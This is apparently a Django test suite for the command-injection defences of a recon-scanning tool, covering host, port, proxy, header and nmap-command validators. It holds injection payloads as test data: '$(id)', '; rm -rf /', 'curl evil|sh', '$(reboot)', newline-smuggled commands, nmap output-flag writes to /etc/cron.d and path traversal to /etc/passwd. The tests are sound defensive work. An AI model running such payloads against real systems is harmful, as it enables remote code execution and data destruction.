"""Tests for the command-injection hardening of the recon tasks.

Covers: the root-cause target re-validation (database_utils.store_*), the shared
allowlist/quote helpers, the subdomain_discovery host guard, and the nmap host
guard. Run with:
    python3 manage.py test tests.test_command_injection
"""
import os
import shlex
import tempfile
import unittest
from unittest.mock import patch

os.environ.setdefault('SURICATOOS_SECRET_KEY', 'secret')

from django.test import TestCase
from django.utils import timezone

import validators
from Suricatoos.tasks import (subdomain_discovery, _safe_int, _allow,
                              _filter_list, _shell_false_headers, SAFE_HOST_RE,
                              SAFE_HOST_ARG_RE, SAFE_TOKEN_RE, SAFE_PATH_RE,
                              SAFE_PORT_RE, SAFE_EXT_RE, PROXY_RE,
                              NMAP_CMD_RE, NMAP_SCRIPT_RE, NMAP_SCRIPT_ARGS_RE)
from Suricatoos.database_utils import store_url, store_domain, store_ip
from Suricatoos.common_func import get_nmap_cmd, is_valid_nmap_command
from dashboard.models import Project
from targetApp.models import Domain
from startScan.models import ScanHistory
from scanEngine.models import EngineType


class TestInjectionHelpers(unittest.TestCase):
    def test_safe_int_coerces_or_defaults(self):
        self.assertEqual(_safe_int('5', 1), 5)
        self.assertEqual(_safe_int(5, 1), 5)
        self.assertEqual(_safe_int(None, 7), 7)
        self.assertEqual(_safe_int('abc', 7), 7)
        self.assertEqual(_safe_int(['x'], 7), 7)   # list YAML value fails safe

    def test_allow_passes_only_clean_values(self):
        self.assertEqual(_allow('example.com', SAFE_HOST_RE), 'example.com')
        self.assertEqual(_allow('1.2.3.4:8080', SAFE_HOST_RE), '1.2.3.4:8080')
        self.assertIsNone(_allow('a;b', SAFE_HOST_RE))
        self.assertIsNone(_allow('a b', SAFE_HOST_RE))
        self.assertIsNone(_allow('$(id)', SAFE_HOST_RE))

    def test_allow_blocks_path_traversal_and_uses_default(self):
        self.assertEqual(_allow('../../etc/passwd', SAFE_TOKEN_RE, 'def'), 'def')
        self.assertEqual(_allow('a b', SAFE_TOKEN_RE, 'def'), 'def')
        self.assertEqual(_allow(['x'], SAFE_HOST_RE, 'def'), 'def')  # non-str fails safe

    def test_proxy_re(self):
        self.assertEqual(_allow('http://1.2.3.4:8080', PROXY_RE, ''), 'http://1.2.3.4:8080')
        self.assertEqual(_allow('socks5://u:p@1.2.3.4:9050', PROXY_RE, ''), 'socks5://u:p@1.2.3.4:9050')
        self.assertEqual(_allow('http://x"; id #', PROXY_RE, ''), '')
        self.assertEqual(_allow('; rm -rf /', PROXY_RE, ''), '')

    def test_filter_list_drops_tainted_items(self):
        self.assertEqual(_filter_list(['a', 'b;c', 'd'], SAFE_TOKEN_RE), ['a', 'd'])
        self.assertEqual(_filter_list('solo', SAFE_TOKEN_RE), ['solo'])
        self.assertEqual(_filter_list(['$(id)'], SAFE_TOKEN_RE), [])

    def test_port_filter(self):
        self.assertEqual(
            _filter_list(['80', '$(id)', '443', '1-1000', '8080;rm'], SAFE_PORT_RE),
            ['80', '443', '1-1000'])

    def test_extension_filter(self):
        self.assertEqual(
            _filter_list(['php', 'js;id', '.html', 'a b'], SAFE_EXT_RE),
            ['php', '.html'])

    def test_shell_false_headers_keeps_documented_format(self):
        # The documented 'Name: value' form must survive as a single, shlex-safe argv
        # token. Header values may legitimately contain spaces (e.g. Authorization:
        # Bearer <token>); the value is preserved and shlex.quote'd so it stays one token
        # when run_command/stream_command tokenize the command with shlex.split.
        self.assertEqual(_shell_false_headers(['Cookie: Test']), " -H 'Cookie: Test'")
        self.assertEqual(
            _shell_false_headers(['X-Forwarded-For: 127.0.0.1']),
            " -H 'X-Forwarded-For: 127.0.0.1'")
        self.assertEqual(_shell_false_headers(['Name:value']), " -H 'Name: value'")

    def test_shell_false_headers_blocks_smuggling(self):
        # A space-containing value (even one that looks like a flag) is no longer dropped,
        # but it MUST remain a single argv token under shlex.split so it cannot smuggle a
        # separate flag into the shell=False command. This is the real security property.
        out = _shell_false_headers(['X: a -config /etc/x'])
        self.assertEqual(out, " -H 'X: a -config /etc/x'")
        self.assertEqual(shlex.split(out), ['-H', 'X: a -config /etc/x'])
        # Control chars / newlines are still rejected outright (cannot be made safe inline).
        self.assertEqual(_shell_false_headers(['X: a\nInjected: 1']), '')
        self.assertEqual(_shell_false_headers([]), '')


class TestStoreTargetRevalidation(TestCase):
    """Region A — the root cause: a URL target's host must be re-validated before
    it becomes a Domain.name that flows into shell commands."""

    def setUp(self):
        self.project = Project.objects.create(
            name='p', slug='p', insert_date=timezone.now())

    def test_clean_url_stores_bare_hostname(self):
        d = store_url('http://example.com:8080/path', self.project, '', None)
        self.assertIsNotNone(d)
        self.assertEqual(d.name, 'example.com')  # port stripped

    def test_metachars_in_userinfo_are_dropped(self):
        # urlparse takes the real host; userinfo (with metachars) is discarded.
        d = store_url('http://user:$(id)@example.com/', self.project, '', None)
        self.assertIsNotNone(d)
        self.assertEqual(d.name, 'example.com')
        for c in ';|$`& ':
            self.assertNotIn(c, d.name)

    def test_metachar_userinfo_with_other_host(self):
        d = store_url('http://example.com;id@evil.com/', self.project, '', None)
        self.assertIsNotNone(d)
        self.assertEqual(d.name, 'evil.com')
        self.assertNotIn(';', d.name)

    def test_metachar_in_actual_host_is_rejected(self):
        before = Domain.objects.count()
        d = store_url('http://evil.com$(id)/', self.project, '', None)
        self.assertIsNone(d)
        self.assertEqual(Domain.objects.count(), before)

    def test_store_domain_rejects_metachars(self):
        self.assertIsNone(store_domain('a.com;curl evil', self.project, '', None))
        self.assertIsNotNone(store_domain('clean.com', self.project, '', None))

    def test_store_ip_rejects_non_ip(self):
        self.assertIsNone(store_ip('1.2.3.4;id', self.project, '', None))
        self.assertIsNotNone(store_ip('1.2.3.4', self.project, '', None))


class TestNmapHostGuard(TestCase):
    """Region F — host is appended AFTER is_valid_nmap_command, so it must be
    guarded separately."""

    def test_unsafe_host_returns_none(self):
        self.assertIsNone(get_nmap_cmd(input_file=None, host='example.com;id'))
        self.assertIsNone(get_nmap_cmd(input_file=None, host='1.2.3.4 -oN /tmp/x'))
        self.assertIsNone(get_nmap_cmd(input_file=None, host='$(reboot)'))

    def test_clean_host_is_appended(self):
        cmd = get_nmap_cmd(input_file=None, host='1.2.3.4')
        self.assertIsNotNone(cmd)
        self.assertTrue(cmd.strip().endswith('1.2.3.4'))

    def test_input_file_path_takes_precedence(self):
        cmd = get_nmap_cmd(input_file='/tmp/in.txt', host='whatever')
        self.assertIsNotNone(cmd)
        self.assertIn('-iL /tmp/in.txt', cmd)


class TestSubdomainDiscoveryHostGuard(TestCase):
    """Region B keystone — a tainted host aborts the scan before any shell
    command runs."""

    def setUp(self):
        self.domain = Domain.objects.create(name='example.com')
        self.engine = EngineType.objects.create(
            engine_name='t', yaml_configuration='subdomain_discovery: {}')
        self.scan = ScanHistory.objects.create(
            domain=self.domain, scan_type=self.engine,
            start_scan_date=timezone.now())
        self.tmp = tempfile.mkdtemp()

    def _ctx(self):
        return {
            'track': False,
            'yaml_configuration': {},
            'results_dir': self.tmp,
            'scan_history_id': self.scan.id,
        }

    @patch('Suricatoos.tasks.run_command')
    def test_unsafe_host_aborts_before_any_command(self, mock_run):
        subdomain_discovery(host='example.com; curl evil|sh', ctx=self._ctx())
        mock_run.assert_not_called()

    @patch('Suricatoos.tasks.run_command')
    def test_unsafe_host_with_backticks_aborts(self, mock_run):
        subdomain_discovery(host='example.com`id`', ctx=self._ctx())
        mock_run.assert_not_called()


class TestAuditResidualFixes(unittest.TestCase):
    """Regression tests for the residual injection findings from the 2026-06-17
    adversarial audit of the command-injection hardening."""

    # --- F1: newline-injection RCE in the nmap command --------------------------
    def test_nmap_command_rejects_newline_rce(self):
        # str.split() hid the injected line from the old per-token allowlist.
        self.assertFalse(is_valid_nmap_command('nmap\ntouch /tmp/pwned'))
        self.assertFalse(is_valid_nmap_command('nmap -sV\nid'))
        self.assertFalse(is_valid_nmap_command('nmap\ttouch x'))
        # ...and get_nmap_cmd must fail closed on a newline-bearing base cmd.
        self.assertIsNone(get_nmap_cmd(
            input_file=None, cmd='nmap\ntouch /tmp/pwned',
            host='ex.com', ports='80', output_file='/r/x.xml'))

    # --- F2: nmap flag smuggling (arbitrary file write / NSE exec) ---------------
    def test_nmap_command_blocks_output_and_datadir_flags(self):
        for bad in ('nmap -oN /etc/cron.d/pwn', 'nmap -oG /tmp/owned',
                    'nmap -oA /tmp/all', 'nmap --datadir /tmp/x',
                    'nmap --stylesheet /tmp/x', 'nmap -iL /tmp/list',
                    'nmap --resume /tmp/x', 'nmap --append-output -oN /tmp/x'):
            self.assertFalse(is_valid_nmap_command(bad), bad)

    def test_nmap_command_allows_expected_flags(self):
        self.assertTrue(is_valid_nmap_command(
            'nmap -sV -p 80,443 --max-rate 100 -oX /results/x.xml'))
        self.assertTrue(is_valid_nmap_command(
            'nmap -sV --script vulners --script-args mincvss=7.0 -oX /r/x.xml'))

    def test_nmap_script_intake_blocks_paths_and_flags(self):
        # NSE script names only: no path (-> /tmp/evil.nse), no leading-dash flag.
        self.assertEqual(
            _filter_list(['vulners', 'http-csrf', '/tmp/evil.nse', '--datadir', 'a/b'],
                         NMAP_SCRIPT_RE),
            ['vulners', 'http-csrf'])

    def test_nmap_cmd_intake_regex(self):
        self.assertIsNotNone(NMAP_CMD_RE.match('nmap'))
        self.assertIsNotNone(NMAP_CMD_RE.match('nmap -sV -p 80'))
        self.assertIsNone(NMAP_CMD_RE.match('nmap\ntouch /tmp/pwned'))
        self.assertIsNone(NMAP_CMD_RE.match('nmap -oN /etc/cron.d/pwn'))  # has '/'
        self.assertIsNone(NMAP_CMD_RE.match('nmap; id'))

    def test_nmap_script_args_intake_regex(self):
        self.assertIsNotNone(NMAP_SCRIPT_ARGS_RE.match('mincvss=7.0,mode=full'))
        self.assertIsNone(NMAP_SCRIPT_ARGS_RE.match('x -oG /tmp/owned'))  # whitespace
        self.assertIsNone(NMAP_SCRIPT_ARGS_RE.match('-oG'))               # leading dash

    # --- contested: nmap host leading-dash smuggling ----------------------------
    def test_nmap_host_rejects_leading_dash(self):
        self.assertIsNone(get_nmap_cmd(input_file=None, host='-sV',
                                       ports='80', output_file='/r/x.xml'))
        cmd = get_nmap_cmd(input_file=None, host='1.2.3.4',
                           ports='80', output_file='/r/x.xml')
        self.assertIsNotNone(cmd)
        self.assertTrue(cmd.strip().endswith('1.2.3.4'))  # shlex.quote is a no-op here

    # --- F4: path traversal via _filter_list (SAFE_PATH_RE contract) ------------
    def test_filter_list_blocks_path_traversal(self):
        self.assertEqual(
            _filter_list(['../../../../etc/passwd', 'cves/2021/x', '-flag'],
                         SAFE_PATH_RE),
            ['cves/2021/x'])  # drops '..' traversal AND leading-dash token

    # --- F5: leading-dash host as a bare argv token -----------------------------
    def test_safe_host_arg_re_forbids_leading_dash(self):
        self.assertEqual(_allow('example.com', SAFE_HOST_ARG_RE, ''), 'example.com')
        self.assertEqual(_allow('1.2.3.4:8080', SAFE_HOST_ARG_RE, ''), '1.2.3.4:8080')
        self.assertEqual(_allow('-d', SAFE_HOST_ARG_RE, ''), '')
        self.assertEqual(_allow('--proxy', SAFE_HOST_ARG_RE, ''), '')

    # --- F6 / cross-cutting: trailing-newline ($ vs \Z) bypass ------------------
    def test_helpers_reject_trailing_newline(self):
        # $-anchored regexes used to accept "80\n" and return it verbatim.
        self.assertIsNone(_allow('80\n', SAFE_PORT_RE))
        self.assertIsNone(_allow('1.2.3.4\n', SAFE_HOST_RE))
        self.assertEqual(_filter_list(['200\n', '301'], SAFE_PORT_RE), ['301'])
        self.assertEqual(_filter_list(['a\nb', 'good'], SAFE_TOKEN_RE), ['good'])

    # --- F3: httpx flag smuggling relies on validators.url rejecting the payload -
    def test_validators_url_rejects_httpx_flag_smuggling(self):
        # http_crawl now filters direct-pass urls through validators.url; lock that
        # the smuggling payloads it depends on are indeed rejected.
        self.assertFalse(validators.url('http://target.com/ -store-response-dir /tmp/pwn'))
        self.assertFalse(validators.url('-config /tmp/attacker.yaml'))
        self.assertTrue(bool(validators.url('http://target.com/path')))


if __name__ == '__main__':
    unittest.main()
